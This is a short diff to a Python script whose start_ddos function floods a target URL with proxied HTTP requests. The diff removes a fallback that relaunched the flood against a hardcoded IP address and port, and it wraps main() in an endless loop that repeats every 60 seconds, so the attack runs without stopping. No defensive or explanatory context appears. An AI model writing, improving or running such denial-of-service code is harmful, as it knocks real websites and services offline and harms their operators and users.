@@ -71,8 +71,6 @@ def start_ddos(prox, url, headers, proxies, color):
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
 			print(color+"{} send requests...".format(prox))
-		else:
-			main("all", "https://207.244.243.149:8085")		
 	except:
 		pass
 
@@ -101,4 +99,8 @@ def main(proxy, url):
 			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
 			exit()
 
-main()
+
+import time
+while(True):
+	main()
+	time.sleep(60)
